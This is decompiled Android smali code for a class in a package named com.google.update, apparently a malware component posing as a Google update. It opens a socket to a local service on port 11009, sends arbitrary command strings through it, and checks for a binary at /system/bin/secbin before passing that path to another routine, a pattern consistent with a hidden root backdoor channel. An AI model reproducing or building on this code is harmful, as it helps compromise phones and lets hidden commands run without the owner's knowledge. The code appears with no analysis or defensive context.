.class public Lcom/google/update/RU$U12;
.super Ljava/lang/Object;
.source "RU.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/google/update/RU;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "U12"
.end annotation


# static fields
.field public static final M1:Ljava/lang/String; = "localhost"

.field public static final M2:I = 0x2b01


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 415
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static U1()Z
    .locals 7

    .prologue
    const-string v5, "localhost"

    .line 421
    const/4 v0, 0x0

    .line 422
    .local v0, "a":Ljava/net/Socket;
    const/4 v2, 0x0

    .line 424
    .local v2, "b":Z
    :try_start_0
    new-instance v1, Ljava/net/Socket;

    const-string v5, "localhost"

    const/16 v6, 0x2b01

    invoke-direct {v1, v5, v6}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 425
    .end local v0    # "a":Ljava/net/Socket;
    .local v1, "a":Ljava/net/Socket;
    if-eqz v1, :cond_3

    .line 426
    :try_start_1
    invoke-virtual {v1}, Ljava/net/Socket;->isConnected()Z

    move-result v5

    if-nez v5, :cond_0

    .line 427
    const-string v5, "localhost"

    invoke-static {v5}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v3

    check-cast v3, Ljava/net/Inet4Address;

    .line 428
    .local v3, "c":Ljava/net/Inet4Address;
    new-instance v5, Ljava/net/InetSocketAddress;

    const/16 v6, 0x2b01

    invoke-direct {v5, v3, v6}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    const v6, 0xc350

    invoke-virtual {v1, v5, v6}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 431
    .end local v3    # "c":Ljava/net/Inet4Address;
    :cond_0
    invoke-virtual {v1}, Ljava/net/Socket;->isConnected()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    move-result v5

    if-eqz v5, :cond_1

    const/4 v2, 0x1

    .line 436
    :cond_1
    :goto_0
    if-eqz v1, :cond_5

    :try_start_2
    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object v0, v1

    .line 438
    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    :cond_2
    :goto_1
    return v2

    .line 432
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :cond_3
    const/4 v2, 0x1

    goto :goto_0

    .line 433
    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    :catch_0
    move-exception v5

    move-object v4, v5

    .line 434
    .local v4, "e":Ljava/lang/Exception;
    :goto_2
    :try_start_3
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 436
    if-eqz v0, :cond_2

    :try_start_4
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_1

    :catch_1
    move-exception v5

    goto :goto_1

    .line 435
    .end local v4    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v5

    .line 436
    :goto_3
    if-eqz v0, :cond_4

    :try_start_5
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 437
    :cond_4
    :goto_4
    throw v5

    .line 436
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :catch_2
    move-exception v5

    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_1

    :catch_3
    move-exception v6

    goto :goto_4

    .line 435
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :catchall_1
    move-exception v5

    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_3

    .line 433
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :catch_4
    move-exception v5

    move-object v4, v5

    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_2

    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :cond_5
    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_1
.end method

.method public static U2(Ljava/lang/String;)Z
    .locals 10
    .param p0, "P1"    # Ljava/lang/String;

    .prologue
    const-string v8, "localhost"

    .line 443
    const/4 v0, 0x0

    .line 444
    .local v0, "a":Ljava/net/Socket;
    const/4 v2, 0x0

    .line 447
    .local v2, "b":Z
    :try_start_0
    new-instance v1, Ljava/net/Socket;

    const-string v8, "localhost"

    const/16 v9, 0x2b01

    invoke-direct {v1, v8, v9}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 448
    .end local v0    # "a":Ljava/net/Socket;
    .local v1, "a":Ljava/net/Socket;
    if-eqz v1, :cond_2

    .line 449
    :try_start_1
    invoke-virtual {v1}, Ljava/net/Socket;->isConnected()Z

    move-result v8

    if-nez v8, :cond_0

    .line 450
    const-string v8, "localhost"

    invoke-static {v8}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v3

    check-cast v3, Ljava/net/Inet4Address;

    .line 451
    .local v3, "c":Ljava/net/Inet4Address;
    new-instance v8, Ljava/net/InetSocketAddress;

    const/16 v9, 0x2b01

    invoke-direct {v8, v3, v9}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    const v9, 0xc350

    invoke-virtual {v1, v8, v9}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 454
    .end local v3    # "c":Ljava/net/Inet4Address;
    :cond_0
    invoke-virtual {v1}, Ljava/net/Socket;->isConnected()Z

    move-result v8

    if-eqz v8, :cond_2

    .line 455
    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    .line 456
    .local v5, "d":Ljava/io/OutputStream;
    invoke-virtual {v1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    .line 457
    .local v7, "f":Ljava/io/InputStream;
    if-eqz v5, :cond_1

    .line 458
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    .line 459
    .local v4, "cmdByte":[B
    invoke-virtual {v5, v4}, Ljava/io/OutputStream;->write([B)V

    .line 460
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    .line 461
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    .line 463
    .end local v4    # "cmdByte":[B
    :cond_1
    if-eqz v7, :cond_2

    .line 464
    const-wide/16 v8, 0x1388

    invoke-static {v8, v9}, Landroid/os/SystemClock;->sleep(J)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 465
    const/4 v2, 0x1

    .line 472
    .end local v5    # "d":Ljava/io/OutputStream;
    .end local v7    # "f":Ljava/io/InputStream;
    :cond_2
    if-eqz v1, :cond_5

    :try_start_2
    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    move-object v0, v1

    .line 475
    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    :cond_3
    :goto_0
    return v2

    .line 469
    :catch_0
    move-exception v8

    move-object v6, v8

    .line 470
    .local v6, "e":Ljava/io/IOException;
    :goto_1
    :try_start_3
    invoke-virtual {v6}, Ljava/io/IOException;->printStackTrace()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 472
    if-eqz v0, :cond_3

    :try_start_4
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_0

    :catch_1
    move-exception v8

    goto :goto_0

    .line 471
    .end local v6    # "e":Ljava/io/IOException;
    :catchall_0
    move-exception v8

    .line 472
    :goto_2
    if-eqz v0, :cond_4

    :try_start_5
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 473
    :cond_4
    :goto_3
    throw v8

    .line 472
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :catch_2
    move-exception v8

    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_0

    :catch_3
    move-exception v9

    goto :goto_3

    .line 471
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :catchall_1
    move-exception v8

    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_2

    .line 469
    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :catch_4
    move-exception v8

    move-object v6, v8

    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_1

    .end local v0    # "a":Ljava/net/Socket;
    .restart local v1    # "a":Ljava/net/Socket;
    :cond_5
    move-object v0, v1

    .end local v1    # "a":Ljava/net/Socket;
    .restart local v0    # "a":Ljava/net/Socket;
    goto :goto_0
.end method

.method public static U3()V
    .locals 3

    .prologue
    const-string v2, "/system/bin/secbin"

    .line 480
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/secbin"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 481
    const-string v0, "/system/bin/secbin"

    const-string v0, ""

    invoke-static {v2, v0}, Lcom/google/update/RU;->U5(Ljava/lang/String;Ljava/lang/String;)V

    .line 482
    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Landroid/os/SystemClock;->sleep(J)V

    .line 484
    :cond_0
    return-void
.end method
